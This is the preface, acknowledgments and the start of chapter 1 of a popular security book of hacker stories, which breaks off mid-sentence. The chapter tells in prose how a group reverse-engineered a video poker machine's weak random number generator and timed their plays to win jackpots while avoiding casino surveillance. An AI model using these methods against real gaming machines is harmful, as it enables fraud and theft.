Preface
Hackers play one-up among themselves. Clearly one of the prizes would
be bragging rights from hacking into my security company’s Web site or
my personal system.
Another would be that they had made up a story of a hack and planted
it on me and my co-author Bill Simon so convincingly that we were taken
in, believed it as true, and included it in this book.
That has presented a fascinating challenge, a game of wits that the two
of us have played time after time as we did the interviews for the book.
For most reporters and authors, establishing authenticity is a fairly rou-
tine matter: Is this really the person he or she claims to be? Is this person
or was this person really working for the organization he or she claims?
Did this person have the position he or she says? Does this person have
documentation to back up the story, and can I verify that the documents
are valid? Are there reputable people who will support the story or parts
of it?
With hackers, checking the bona fides is tricky. Most of the people
whose stories appear in this book, other than a few who have already
been to prison, would face felony charges if their true identities could be
determined. So, asking for real names, or expecting to be offered as
proof, is an iffy proposition.
These people have only come forward with their stories because they
trust me. They know I’ve done time myself, and they are willing to rely
on my not betraying them in a way that could put them in that position.
Yet, despite the risks, many did offer tangible proof of their hacks.
Even so, it’s possible — in fact, it’s likely — that some people exagger-
ated their stories with details intended to make them more compelling,
or spun a story that was a total fabrication, but constructed around
enough workable exploits to give them the ring of truth.
Because of that risk, we have been diligent in holding to a high stan-
dard of reliability. Through all the interviews, I have challenged every
technical detail, asking for in-depth explanations of anything that didn’t
ix
03_569597 fpref.qxd  1/11/05  9:21 PM  Page ix

sound quite right, and sometimes following up later to see if the story
was still the same or if he or she told it differently the second time
around. Or, if this person “couldn’t remember” when asked about some
hard-to-accomplish step omitted from the story. Or, if this person just
didn’t seem to know enough to do what he or she claimed or couldn’t
explain how he or she got from point A to point B.
Except where specifically noted, every one of the main stories in this
book has passed my “smell test.” My co-author and I agreed on the
believability of every person whose story we have included. Nevertheless,
details have often been changed to protect the hacker and the victim. In
several of the stories, the identities of companies are disguised. I modi-
fied the names, industries, and locations of targeted organizations. In
some cases, there is misleading information to protect the identity of the
victim or to prevent a duplication of the crime. However, the basic vul-
nerabilities and nature of the incidents are accurate.
At the same time, because software developers and hardware manufac-
turers are continually fixing security vulnerabilities through patches and
new product versions, few of the exploits described in these pages still
work as described here. This might lead the overconfident reader to
decide that he or she need not be concerned, that, with vulnerabilities
attended to and corrected, the reader and his or her company have noth-
ing to be worried about. But the lesson of these stories, whether they
happened six months ago or six years ago, is that hackers are finding new
vulnerabilities every day. Read the book not to learn specific vulnerabili-
ties in specific products, but to change your attitudes and gain a new
resolve.
And read the book, too, to be entertained, awed, amazed at the con-
tinually surprising exploits of these wickedly clever hackers.
Some are shocking, some are eye-opening, some will make you laugh
at the inspired nerve of the hacker. If you’re an IT or security profes-
sional, every story has lessons for you on making your organization more
secure. If you’re a non-technical person who enjoys stories of crime, dar-
ing, risk-taking, and just plain guts, you’ll find all that here.
Every one of these adventures involved the danger of a knock at the
door, where a posse of cops, FBI agents, and Secret Service types would
be waiting with handcuffs ready. And, in a number of the cases, that’s
exactly what happened.
For the rest, the possibility still remains. No wonder most of these
hackers have never been willing to tell their stories before. Most of these
adventures you will read here are being published for the very first time.The Art of Intrusion x03_569597 fpref.qxd  1/11/05  9:21 PM  Page x

Acknowledgments
By Kevin Mitnick
This book is dedicated to my wonderful family, close friends, and, most
of all, the people that made this book possible — the black-hat and
white-hat hackers who contributed their stories for our education and
entertainment.
The Art of Intrusion was even more challenging to write than our last
book. Instead of using our combined creative talent to develop stories
and anecdotes to illustrate the dangers of social engineering and what
businesses can do to mitigate it, both Bill Simon and I relied heavily on
interviewing former hackers, phone phreaks, and hackers turned security
professionals. We wanted to write a book that would be both a crime
thriller and an eye-opening guide to helping businesses protect their
valuable information and computing resources. We strongly believe that
by disclosing the common methodologies and techniques used by hack-
ers to break into systems and networks, we can influence the community
at large to adequately address these risks and threats posed by savvy
adversaries.
I have had the extraordinary fortune of being teamed up with best-
selling author Bill Simon, and we worked diligently together on this new
book. Bill’s notable skills as a writer include his magical ability to take
information provided by our contributors and write it in such a style and
manner that anyone’s grandmother could understand it. More impor-
tantly, Bill has become more than just a business partner in writing, but
a loyal friend who has been there for me during this whole development
process. Although we had some moments of frustration and differences
of opinion during the development phase, we always work it out to our
mutual satisfaction. In a little over two years, I’ll finally be able to write
and publish the The Untold Story of Kevin Mitnick, after certain govern-
ment restrictions expire. Hopefully, Bill and I will collaborate on this
project as well.

Bill’s wonderful wife, Arynne Simon, also has a warm place in my heart.
I appreciate her love, kindness, and generosity that she has shown me in
the last three years. My only disappointing experience is not being able
to enjoy her great cooking. Now that the book is finally finished, maybe
I can convince her to cook a celebration dinner!
Having been so focused on The Art of Intrusion, I haven’t been able to
spend much quality time with family and close friends. I became some-
what of a workaholic, similar to the days where I’d spend countless hours
behind the keyboard exploring the dark corners of cyberspace. 
I want to thank my loving girlfriend, Darci Wood, and her game-loving
daughter Briannah for being supportive and patient during this time-
consuming project. Thank you, baby, for all your love, dedication, and
support that you and Briannah have provided me while working on this
and other challenging projects.
This book would not have been possible without the love and support
of my family. My mother, Shelly Jaffe, and my grandmother, Reba
Vartanian, have given me unconditional love and support throughout my
life. I am so fortunate to have been raised by such a loving and dedicated
mother, who I also consider my best friend. My grandmother has been
like a second mom to me, providing me with the same nurturing and love
that usually only a mother can give. She has been extremely helpful in
handling some of my business affairs, which at times interfered with her
schedule. In every instance, she made my business a top priority, even
when it was inconvenient to do so. Thank you, Gram, for helping me get
the job done whenever I needed you. As caring and compassionate peo-
ple, they’ve taught me the principles of caring about others and lending
a helping hand to the less fortunate. And so, by imitating the pattern of
giving and caring, I, in a sense, follow the paths of their lives. I hope
they’ll forgive me for putting them on the back burner during the process
of writing this book, passing up chances to see them with the excuse of
work and deadlines to meet. This book would not have been possible
without their continued love and support that I’ll forever hold close to
my heart. 
How I wish my Dad, Alan Mitnick, and my brother, Adam Mitnick,
would have lived long enough to break open a bottle of champagne with
me on the day our second book first appears in a bookstore. As a sales-
man and business owner, my father taught me many of the finer things
that I will never forget. 
My mother’s late boyfriend, Steven Knittle, has been a father figure to
me for the past 12 years. I took great comfort knowing that you were
always there to take care of my mom when I could not. Your passing hasThe Art of Intrusion xii04_569597 flast.qxd  1/11/05  9:25 PM  Page xii

had a profound impact on our family and we miss your humor, laughter,
and the love you brought to our family. RIP.
My aunt Chickie Leventhal will always have a special place in my heart.
Over the last couple years, our family ties have been strengthened, and
our communication has been wonderful. Whenever I need advice or a
place to stay, she is always there offering her love and support. During my
intense devotion to writing this book, I sacrificed many opportunities to
join her, my cousin, Mitch Leventhal, and her boyfriend, Dr. Robert
Berkowitz, for our family get-togethers.
My friend Jack Biello was a loving and caring person who spoke out
against the extraordinary mistreatment I endured at the hands of jour-
nalists and government prosecutors. He was a key voice in the Free Kevin
movement and a writer who had an extraordinary talent for writing com-
pelling articles exposing the information that the government didn’t
want you to know. Jack was always there to fearlessly speak out on my
behalf and to work together with me preparing speeches and articles,
and, at one point, represented me as a media liaison. While finishing up
the manuscript for The Art of Deception (Wiley Publishing, Inc., 2002),
Jack’s passing left me feeling a great sense of loss and sadness. Although
it’s been two years, Jack is always in my thoughts. 
One of my closest friends, Caroline Bergeron, has been very support-
ive of my endeavor to succeed on this book project. She is a lovely and
brilliant soon-to-be lawyer living in the Great White North. Having met
her during one of my speaking engagements in Victoria, we hit it off
right away. She lent her expertise to proofreading, editing, and correct-
ing the two-day social engineering seminar that Alex Kasper and I devel-
oped. Thank you, Caroline, for being there for me.
My colleague Alex Kasper is not only my best friend but also my col-
league; we are currently working on delivering one-day and two-day sem-
inars on how businesses can recognize and defend against social
engineering attacks. Together we hosted a popular Internet talk radio
show known as “The Darkside of the Internet” on KFI radio in Los
Angeles. You have been a great friend and confidant. Thank you for your
invaluable assistance and advice. Your influence has always been positive
and helpful with a kindness and generosity that often extended far
beyond the norm. 
Paul Dryman has been a family friend for many, many years. Paul was
my late father’s best friend. After my dad’s passing, Paul has been a father
figure, always willing to help and talk with me about anything on my
mind. Thank you, Paul, for your loyal and devoted friendship to my
father and I for so many years.Acknowledgments

Amy Gray has managed my speaking career for the last three years. Not
only do I admire and adore her personality, but I value how she treats
other people with such respect and courtesy. Your support and dedication
to professionalism has contributed to my success as a public speaker and
trainer. Thank you so much for your continued friendship and your
commitment to excellence. 
Attorney Gregory Vinson was on my defense team during my years-
long battle with the government. I’m sure he can relate to Bill’s under-
standing and patience for my perfectionism; he has had the same
experience working with me on legal briefs he has written on my behalf.
Gregory is now my business attorney diligently working with me on new
contracts and negotiating business deals. Thank you for your wonderful
support and diligent work, especially when needed on short notice.
Eric Corley (aka Emmanuel Goldstein) has been an active supporter
and close friend for over a decade. He has always looked out for my best
interest and has publicly defended me when I was demonized by
Miramax Films and certain other journalists. Eric has been extremely
instrumental in getting the word out during the government’s prosecu-
tion of me. Your kindness, generosity, and friendship mean more to me
than words can express. Thank you for being a loyal and trusted friend.
Steve Wozniak and Sharon Akers have given much of their time to assist
me and are always there to help me out. The frequent rearranging of your
schedules to be there to support me is much appreciated and it warms me
to call both of you my friends. Hopefully, now that this book is com-
pleted, we will have more time to get together for some gadget quality
time. Steve — I’ll never forget the time that you, Jeff Samuels, and I
drove through the night in your Hummer to get to DEFCON in Las
Vegas, switching drivers constantly so that we could all check our e-mail
and chat with friends over our GPRS wireless connections.
And as I write these acknowledgments, I realize I have so many people
to thank and to express appreciation to for offering their love, friendship,
and support. I cannot begin to remember the names of all the kind and
generous people that I’ve met in recent years, but suffice to say, I would
need a large USB flash drive to store them all. There have been so many
people from all over the world who have written me words of encour-
agement, praise, and support. These words have meant a great deal to
me, especially during the times I needed it most. 
I’m especially thankful to all my supporters who stood by me and spent
their valuable time and energy getting the word out to anyone that would
listen, voicing their concern and objection over my unfair treatment andThe Art of Intrusion xiv04_569597 flast.qxd  1/11/05  9:25 PM  Page xiv

the hyperbole created by those who sought to profit from the “The Myth
of Kevin Mitnick.” 
I’m eager to thank those people who represent my professional career
and are dedicated in extraordinary ways. David Fugate, of Waterside
Productions, is my book agent who went to bat for me on many occa-
sions before and after the book contract was signed.
I very much appreciate the opportunity that John Wiley & Sons has
given me to author another book, and for their confidence in our ability
to develop a best seller. I wish to thank the following Wiley people who
made this dream possible: Ellen Gerstein; Bob Ipsen; Carol Long, who
always promptly responds to my questions and concerns (my number one
contact at Wiley and executive editor); and Emilie Herman and Kevin
Shafer (developmental editors), who have both worked with us as a team
to get the job done.
I have had too many experiences with lawyers, but I am eager to have
a place to express my thanks for the lawyers who, during the years of my
negative interactions with the criminal justice system, stepped up and
offered to help me when I was in desperate need. From kind words to
deep involvement with my case, I met many who don’t at all fit the
stereotype of the self-centered attorney. I have come to respect, admire,
and appreciate the kindness and generosity of spirit given to me so freely
by so many. They each deserve to be acknowledged with a paragraph of
favorable words; I will at least mention them all by name, for every one
of them lives in my heart surrounded by appreciation: Greg Aclin, Fran
Campbell, Lauren Colby, John Dusenbury, Sherman Ellison, Omar

given me advice and support, and have reached out in many ways, are
important to recognize and acknowledge. They are JJ Abrams, Sharon

By Bill Simon
In doing our first book, The Art of Deception , Kevin Mitnick and I forged
a friendship. While writing this one, we continually found new ways of
working together while deepening our friendship. So, my first words of
appreciation go to Kevin for being an outstanding “travel companion” as
we shared this second journey.
David Fugate, my agent at Waterside Productions and the man respon-
sible for bringing Kevin and me together in the first place, tapped into his
usual store of patience and wisdom to find ways of solving those few mis-
erable situations that cropped up. When the going gets tough, every
writer should be blessed with an agent who is as wise and as good a
friend. Ditto for my longtime friend Bill Gladstone, the founder of
Waterside Productions and my principal agent. Bill remains a key factor
in the success of my writing career and has my everlasting gratitude.
My wife Arynne continues to inspire me anew each day with her love
and her dedication to excellence; I appreciate her more than I can say in
words. She has increased my proficiency as a writer because of her intel-
ligence and willingness to be forthright by telling me straight out whenThe Art of Intrusion xvi04_569597 flast.qxd  1/11/05  9:25 PM  Page xvi

my writing has missed the mark. Somehow she gets through the steam of
wrath that is my usual initial response to her suggestions, but in the end
I accept the wisdom of her suggestions and do the rewrite. 
Mark Wilson lent a helping hand that made a difference. Emilie
Herman was a champion of an editor. And I can’t overlook the work of
Kevin Shafer, who took over after Emilie left. 
Even a sixteenth book accumulates a debt to people who along the way
have been more than a little helpful; of the many, I especially want to
mention Kimberly Valentini and Maureen Maloney of Waterside, and
Josephine Rodriguez. Marianne Stuber did her usual fast turnaround
transcribing (not easy with all those strange technical terms and hacker
slang) and Jessica Dudgeon kept the office on an even keel. Darci Wood
was a champ about the time her Kevin dedicated to getting this book
done. 
Special thanks to daughter Victoria and son Sheldon for their under-
standing, and to my twin grandchildren Vincent and Elena, all of whom
I trust I will be able to see more once this manuscript is delivered.
To the many who offered us stories, and especially to those whose com-
pelling stories we chose to use, Kevin and I are deeply indebted. They
came forward despite significant risks. Had their names been revealed, in
many cases they would have faced being dragged away by the men in
blue. Even those whose stories weren’t used showed courage in their will-
ingness to share, and deserve to be admired for it. We do, indeed, admire
them.Acknowledgments

Chapter 1
Hacking the Casinos
for a Million Bucks 
Every time [some software engineer] says, “Nobody will go to the trouble of
doing that,” there’s some kid in Finland who will go to the trouble.
— Alex Mayfield
There comes a magical gambler’s moment when simple thrills
magnify to become 3-D fantasies — a moment when greed
chews up ethics and the casino system is just another mountain
waiting to be conquered. In that single moment the idea of a foolproof
way to beat the tables or the machines not only kicks in but kicks one’s
breath away. 
Alex Mayfield and three of his friends did more than daydream. Like
many other hacks, this one started as an intellectual exercise just to see if
it looked possible. In the end, the four actually beat the system, taking
the casinos for “about a million dollars,” Alex says.
In the early 1990s, the four were working as consultants in high-tech
and playing life loose and casual. “You know — you’d work, make some
money, and then not work until you were broke.”
Las Vegas was far away, a setting for movies and television shows. So
when a technology firm offered the guys an assignment to develop some
software and then accompany it to a trade show at a high-tech conven-
tion there, they jumped at the opportunity. It would be the first in Vegas
for each of them, a chance to see the flashing lights for themselves, all
expenses paid; who would turn that down? The separate suites for each
in a major hotel meant that Alex’s wife and Mike’s girlfriend could be05_569597 ch01.qxd  1/11/05  9:27 PM  Page 1

included in the fun. The two couples, plus Larry and Marco, set off for
hot times in Sin City. 
Alex says they didn’t know much about gambling and didn’t know
what to expect. “You get off the plane and you see all the old ladies play-
ing the slots. It seems funny and ironic, and you soak that in.” 
After the four had finished doing the trade show, they and the two
ladies were sitting around in the casino of their hotel playing slot
machines and enjoying free beers when Alex’s wife offered a challenge: 
“Aren’t these machines based on computers? You guys are into
computers, can’t you do something so we win more?”
The guys adjourned to Mike’s suite and sat around tossing out ques-
tions and offering up theories on how the machines might work.
Research
That was the trigger. The four “got kinda curious about all that, and we
started looking into it when we got back home,” Alex says, warming up
to the vivid memories of that creative phase. It took only a little while for
the research to support what they already suspected. “Yeah, they’re com-
puter programs basically. So then we were interested in, was there some
way that you could crack these machines?”
There were people who had beaten the slot machines by “replacing the
firmware” — getting to the computer chip inside a machine and substi-
tuting the programming for a version that would provide much more
attractive payoffs than the casino intended. Other teams had done that,
but it seemed to require conspiring with a casino employee, and not just
any employee but one of the slot machine techies. To Alex and his bud-
dies, “swapping ROMs would have been like hitting an old lady over the
head and taking her purse.” They figured if they were going to try this,
it would be as a challenge to their programming skills and their intellects.
And besides, they had no advanced talents in social engineering; they
were computer guys, lacking any knowledge of how you sidle up to a
casino employee and propose that he join you in a little scheme to take
some money that doesn’t belong to you. 
But how would they begin to tackle the problem? Alex explained:
We were wondering if we could actually predict something about
the sequence of the cards. Or maybe we could find a back door
[software code allowing later unauthorized access to the program]
that some programmer may have put in for his own benefit. All
programs are written by programmers, and programmers are The Art of Intrusion 205_569597 ch01.qxd  1/11/05  9:27 PM  Page 2

mischievous creatures. We thought that somehow we might stumble
on a back door, such as pressing some sequence of buttons to change
the odds, or a simple programming flaw that we could exploit.
Alex read the book The Eudaemonic Pie by Thomas Bass (Penguin,
1992), the story of how a band of computer guys and physicists in the
1980s beat roulette in Las Vegas using their own invention of a “wear-
able” computer about the size of a pack of cigarettes to predict the out-
come of a roulette play. One team member at the table would click
buttons to input the speed of the roulette wheel and how the ball was
spinning, and the computer would then feed tones by radio to a hearing
aid in the ear of another team member, who would interpret the signals
and place an appropriate bet. They should have walked away with a ton
of money but didn’t. In Alex’s view, “Their scheme clearly had great
potential, but it was plagued by cumbersome and unreliable technology.
Also, there were many participants, so behavior and interpersonal rela-
tions were an issue. We were determined not to repeat their mistakes.”
Alex figured it should be easier to beat a computer-based game
“because the computer is completely deterministic” — the outcome
based on by what has gone before, or, to paraphrase an old software engi-
neer’s expression, good data in, good data out. (The original expression
looks at this from the negative perspective: “garbage in, garbage out.”)
This looked right up his alley. As a youngster, Alex had been a musi-
cian, joining a cult band and dreaming of being a rock star, and when that
didn’t work out had drifted into the study of mathematics. He had a tal-
ent for math, and though he had never cared much for schooling (and
had dropped out of college), he had pursued the subject enough to have
a fairly solid level of competence. 
Deciding that some research was called for, he traveled to Washington,
DC, to spend some time in the reading room of the Patent Office. “I fig-
ured somebody might have been stupid enough to put all the code in the
patent” for a video poker machine. And sure enough, he was right. “At
that time, dumping a ream of object code into a patent was a way for a
patent filer to protect his invention, since the code certainly contains a
very complete description of his invention, but in a form that isn’t terri-
bly user-friendly. I got some microfilm with the object code in it and then
scanned the pages of hex digits for interesting sections, which had to be
disassembled into [a usable form].”
Analyzing the code uncovered a few secrets that the team found
intriguing, but they concluded that the only way to make any real
progress would be to get their hands on the specific type of machine they
wanted to hack so they could look at the code for themselves.Chapter 1 Hacking the Casinos for a Million Bucks

As a team, the guys were well matched. Mike was a better-than-
competent programmer, stronger than the other three on hardware
design. Marco, another sharp programmer, was an Eastern European
immigrant who looked like a teenager. But he was something of a dare-
devil, approaching everything with a can-do, smart-ass attitude. Alex
excelled at programming and was the one who contributed the knowl-
edge of cryptography they would need. Larry wasn’t much of a pro-
grammer and because of a motorcycle accident couldn’t travel much, but
was a great organizer who kept the project on track and everybody
focused on what needed to be done at each stage.
After their initial research, Alex “sort of forgot about” the project.
Marco, though, was hot for the idea. He kept insisting, “It’s not that big
a deal, there’s thirteen states where you can legally buy machines.”
Finally he talked the others into giving it a try. “We figured, what the
hell.” Each chipped in enough money to bankroll the travel and the cost
of a machine. They headed once again for Vegas — this time at their own
expense and with another goal in mind.
Alex says, “To buy a slot machine, basically you just had to go in and show
ID from a state where these machines are legal to own. With a driver’s
license from a legal state, they pretty much didn’t ask a lot of questions.”
One of the guys had a convenient connection to a Nevada resident. “He was
like somebody’s girlfriend’s uncle or something, and he lived in Vegas.” 
They chose Mike as the one to talk to this man because “he has a sales-y
kind of manner, a very presentable sort of guy. The assumption is that you’re
going to use it for illegal gambling. It’s like guns,” Alex explained. A lot of
the machines get gray-marketed — sold outside accepted channels — to
places like social clubs. Still, he found it surprising that “we could buy the
exact same production units that they use on the casino floor.”
Mike paid the man 1,500 bucks for a machine, a Japanese brand.
“Then two of us put this damn thing in a car. We drove it home as if we
had a baby in the back seat.”
Developing the Hack
Mike, Alex, and Marco lugged the machine upstairs to the second floor
of a house where they had been offered the use of a spare bedroom. The
thrill of the experience would long be remembered by Alex as one of the
most exciting in his life. 
We open it up, we take out the ROM, we figure out what proces-
sor it is. I had made a decision to get this Japanese machine that
looked like a knockoff of one of the big brands. I just figured theThe Art of Intrusion 405_569597 ch01.qxd  1/11/05  9:27 PM  Page 4

engineers might have been working under more pressure, they
might have been a little lazy or a little sloppy. 
It turned out I was right. They had used a 6809 [chip], similar
to a 6502 that you saw in an Apple II or an Atari. It was an 
8-bit chip with a 64K memory space. I was an assembly language
programmer, so this was familiar. 
The machine Alex had chosen was one that had been around for some
10 years. Whenever a casino wants to buy a machine of a new design, the
Las Vegas Gaming Commission has to study the programming and make
sure it’s designed so the payouts will be fair to the players. Getting a new
design approved can be a lengthy process, so casinos tend to hold on to
the older machines longer than you would expect. For the team, an older
machine seemed likely to have outdated technology, which they hoped
might be less sophisticated and easier to attack.
The computer code they downloaded from the chip was in binary
form, the string of 1’s and 0’s that is the most basic level of computer
instructions. To translate that into a form they could work with, they
would first have to do some reverse engineering — a process an engineer
or programmer uses to figure out how an existing product is designed; in
this case it meant converting from machine language to a form that the
guys could understand and work with. 
Alex needed a disassembler to translate the code. The foursome didn’t
want to tip their hand by trying to purchase the software — an act they
felt would be equivalent to going into your local library and trying to
check out books on how to build a bomb. The guys wrote their own dis-
assembler, an effort that Alex describes as “not a piece of cake, but it was
fun and relatively easy.” 
Once the code from the video poker machine had been run through
the new disassembler, the three programmers sat down to pour over it.
Ordinarily it’s easy for an accomplished software engineer to quickly
locate the sections of a program he or she wants to focus on. That’s
because a person writing code originally puts road signs all through it —
notes, comments, and remarks explaining the function of each section,
something like the way a book may have part titles, chapter titles, and
subheadings for sections within a chapter.
When a program is compiled into the form that the machine can read,
these road signs are ignored — the computer or microprocessor has no
need for them. So code that has been reverse-engineered lacks any of
these useful explanations; to keep with the “road signs” metaphor, this
recovered code is like a roadmap with no place names, no markings of
highways or streets.Chapter 1 Hacking the Casinos for a Million Bucks
 505_569597 ch01.qxd  1/11/05  9:27 PM  Page 5

They sifted through the pages of code on-screen looking for clues to
the basic questions: “What’s the logic? How are the cards shuffled? How
are replacement cards picked?” But the main focus for the guys at this
juncture was to locate the code for the random number generator
(RNG). Alex’s guess that the Japanese programmers who wrote the code
for the machine might have taken shortcuts that left errors in the design
of the random number generator turned out to be correct; they had.
Rewriting the Code
Alex sounds proud in describing this effort. “We were programmers; we
were good at what we did. We figured out how numbers in the code turn
into cards on the machine and then wrote a piece of C code that would
do the same thing,” he said, referring to the programming language
called “C.”
We were motivated and we did a lot of work around the clock. I’d
say it probably took about two or three weeks to get to the point
where we really had a good grasp of exactly what was going on in
the code. 
You look at it, you make some guesses, you write some new code,
burn it onto the ROM [the computer chip], put it back in the
machine, and see what happens. We would do things like write
routines that would pop hex [hexadecimal] numbers on the screen
on top of the cards. So basically get a sort of a design overview of
how the code deals the cards.
It was a combination of trial and error and top-down analysis;
the code pretty quickly started to make sense. So we understood
everything about exactly how the numbers inside the computer
turn into cards on the screen.
Our hope was that the random number generator would be rela-
tively simple. And in this case in the early 90’s, it was. I did a lit-
tle research and found out it was based on something that
Donald Knuth had written about in the 60’s. These guys didn’t
invent any of this stuff; they just took existing research on Monte
Carlo methods and things, and put it into their code. 
We figured out exactly what algorithm they were using to gener-
ate the cards; it’s called a linear feedback shift register, and it was
a fairly good random number generator. 
But they soon discovered the random number generator had a fatal flaw
that made their task much easier. Mike explained that “it was a relativelyThe Art of Intrusion 605_569597 ch01.qxd  1/11/05  9:27 PM  Page 6

simple 32-bit RNG, so the computational complexity of cracking it was
within reach, and with a few good optimizations became almost trivial.”
So the numbers produced were not truly random. But Alex thinks
there’s a good reason why this has to be so:
If it’s truly random, they can’t set the odds. They can’t verify
what the odds really are. Some machines gave sequential royal
flushes. They shouldn’t happen at all. So the designers want to be
able to verify that they have the right statistics or they feel like they
don’t have control over the game.
Another thing the designers didn’t realize when they designed this
machine is that basically it’s not just that they need a random
number generator. Statistically there’s ten cards in each deal —
the five that show initially, and one alternate card for each of
those five that will appear if the player chooses to discard. It turns
out in these early versions of the machine, they basically took those
ten cards from ten sequential random numbers in the random
number generator.
So Alex and his partners understood that the programming instructions
on this earlier-generation machine were poorly thought out. And because
of these mistakes, they saw that they could write a relatively simple but
elegantly clever algorithm to defeat the machine. 
The trick, Alex saw, would be to start a play, see what cards showed up
on the machine, and feed data into their own computer back at home
identifying those cards. Their algorithm would calculate where the ran-
dom generator was, and how many numbers it had to go through before
it would be ready to display the sought-after hand, the royal flush. 
So we’re at our test machine and we run our little program and
it correctly tells us the upcoming sequence of cards. We were pretty
excited.
Alex attributes that excitement to “knowing you’re smarter than some-
body and you can beat them. And that, in our case, it was gonna make
us some money.” 
They went shopping and found a Casio wristwatch with a countdown
feature that could be set to tenths of a second; they bought three, one
for each of the guys who would be going to the casinos; Larry would be
staying behind to man the computer. 
They were ready to start testing their method. One of the team would
begin to play and would call out the hand he got — the denomination
and suit of each of the five cards. Larry would enter the data into theirChapter 1 Hacking the Casinos for a Million Bucks
 705_569597 ch01.qxd  1/11/05  9:27 PM  Page 7

own computer; though something of an off-brand, it was a type popular
with nerds and computer buffs, and great for the purpose because it had
a much faster chip than the one in the Japanese video poker machine. It
took only moments to calculate the exact time to set into one of the
Casio countdown timers.
When the timer went off, the guy at the slot machine would hit the
Play button. But this had to be done accurately to within a fraction of a
second. Not as much of a problem as it might seem, as Alex explained:
Two of us had spent some time as musicians. If you’re a musician
and you have a reasonable sense of rhythm, you can hit a button
within plus or minus five milliseconds. 
If everything worked the way it was supposed to, the machine would
display the sought-after royal flush. They tried it on their own machine,
practicing until all of them could hit the royal flush on a decent percent-
age of their tries. 
Over the previous months, they had, in Mike’s words, “reverse engi-
neering the operation of the machine, learned precisely how the random
numbers were turned into cards on the screen, precisely when and how
fast the RNG iterated, all of the relevant idiosyncrasies of the machine,
and developed a program to take all of these variables into consideration
so that once we know the state of a particular machine at an exact instant
in time, we could predict with high accuracy the exact iteration of the
RNG at any time within the next few hours or even days.” 
They had defeated the machine — turned it into their slave. They had
taken on a hacker’s intellectual challenge and had succeeded. The knowl-
edge could make them rich. 
It was fun to daydream about. Could they really bring it off in the jun-
gle of a casino? 
Back to the Casinos — This Time to Play
It’s one thing to fiddle around on your own machine in a private, safe
location. Trying to sit in the middle of a bustling casino and steal their
money — that’s another story altogether. That takes nerves of steel.
Their ladies thought the trip was a lark. The guys encouraged tight
skirts and flamboyant behavior — gambling, chatting, giggling, ordering
drinks — hoping the staff in the security booth manning the “Eye in the
Sky” cameras would be distracted by pretty faces and a show of flesh. “So
we pushed that as much as possible,” Alex remembers.The Art of Intrusion 805_569597 ch01.qxd  1/11/05  9:27 PM  Page 8

The hope was that they could just fit in, blending with the crowd.
“Mike was the best at it. He was sort of balding. He and his wife just
looked like typical players.”
Alex describes the scene as if it had all happened yesterday. Marco and
Mike probably did it a little differently, but this is how it worked for Alex:
With his wife Annie, he would first scout a casino and pick out one video
poker machine. He needed to know with great precision the exact cycle
time of the machine. One method they used involved stuffing a video
camera into a shoulder bag; at the casino, the player would position the
bag so the camera lens was pointing at the screen of the video poker
machine, and then he would run the camera for a while. “It could be
tricky,” he remembers, “trying to hoist the bag into exactly the right
position without looking like the position really mattered. You just don’t
want to do anything that looks suspicious and draws attention.” Mike
preferred another, less demanding method: “Cycle timing for unknown
machines out in the field was calculated by reading cards off the screen
at two times, many hours apart.” He had to verify that the machine had
not been played in between, because that would alter the rate of iteration,
but that was easy: just check to see that the cards displayed were the same
as when he had last been at the machine, which was usually the case since
“high stakes machines tended to not be played often.” 
When taking the second reading of cards displayed, he would also syn-
chronize his Casio timer, and then phone the machine timing data and
card sequences back to Larry, who would enter it into their home-base
computer and run the program. Based on those data, the computer
would predict the time of the next royal flush. “You hoped it was hours;
sometimes it was days,” in which case they’d have to start all over with
another machine, maybe at a different hotel. At this stage, the timing of
the Casio might be off as much as a minute or so, but close enough.
Returning plenty early in case someone was already at the target machine,
Alex and Annie would go back to the casino and spend time on other
machines until the player left. Then Alex would sit down at the target
machine, with Annie at the machine next to him. They’d started playing,
making a point of looking like they were having fun. Then, as Alex recalls:
I’d start a play, carefully synchronized to my Casio timer. When
the hand came up, I’d memorize it — the value and suit of each
of the five cards, and then keep playing until I had eight cards in
sequence in memory. I’d nod to my wife that I was on my way
and head for an inconspicuous pay phone just off the casino floor.
I had about eight minutes to get to the phone, do what I had to
do, and get back to the machine. My wife kept on playing.Chapter 1 Hacking the Casinos for a Million Bucks
 905_569597 ch01.qxd  1/11/05  9:27 PM  Page 9

Anybody who came along to use my machine, she’d just tell them
her husband was sitting there. 
We had figured out a way of making a phone call to Larry’s beeper,
and entering numbers on the telephone keypad to tell him the cards.
That was so we didn’t have to say the cards out loud — the casino
people are always listening for things like that. Larry would again
enter the cards into the computer and run our program.
Then I’d phone him. Larry would hold the handset up to the com-
puter, which would give two sets of little cue tones. On the first
one, I’d hit the Pause button on the timer, to stop it counting
down. On the second one, I’d hit Pause again to restart the timer.
The cards Alex reported gave the computer an exact fix on where the
machine’s random number generator was. By entering the delay ordered
by the computer, Alex was entering a crucial correction to the Casio
countdown timer so it would go off at exactly the moment that the royal
flush was ready to appear.
Once that countdown timer was restarted, I went back to the
machine. When the timer went like “beep, beep, boom” — right then,
right on that “boom,” I hit the play button on the machine again. 
That first time, I think I won $35,000. 
We got up to the point where we had about 30 or 40 percent suc-
cess because it was pretty well worked out. The only times it didn’t
work was when you didn’t get the timing right.
For Alex, the first time he won was “pretty exciting, but scary. The pit boss
was this scowling Italian dude. I was sure he was looking at me funny, with
this puzzled expression on his face, maybe because I was going to the phone
all the time. I think he may have gone up to look at the tapes.” Despite the
tensions, there was “a thrill to it.” Mike remembers being “naturally nerv-
ous that someone might have noticed odd behavior on my part, but in fact
no one looked at me funny at all. My wife and I were treated just as typical
high-stakes winners — congratulated and offered many comps.”
They were so successful that they needed to worry about winning so much
money that they would draw attention to themselves. They started to rec-
ognize that they faced the curious problem of too much success. “It was very
high profile. We were winning huge jackpots in the tens of thousands of dol-
lars. A royal flush pays 4,000 to 1; on a $5 machine, that’s twenty grand.”
It goes up from there. Some of the games are a type called progressive —
the jackpot keeps increasing until somebody hits, and the guys were able to
win those just as easily. The Art of Intrusion 1005_569597 ch01.qxd  1/11/05  9:27 PM  Page 10

I won one that was 45 grand. A big-belt techie guy came out —
probably the same guy that goes around and repairs the machines.
He has a special key that the floor guys don’t have. He opens up
the box, pulls out the [electronics] board, pulls out the ROM chip
right there in front of you. He has a ROM reader with him that
he uses to test the chip from the machine against some golden mas-
ter that’s kept under lock and key. 
The ROM test had been standard procedure for years, Alex learned. He
assumes that they had “been burned that way” but eventually caught on
to the scheme and put in the ROM-checking as a countermeasure.
Alex’s statement left me wondering if the casinos do this check because
of some guys I met in prison who did actually replace the firmware. I
wondered how they could do that quickly enough to avoid being caught.
Alex figured this was a social engineering approach, that they had com-
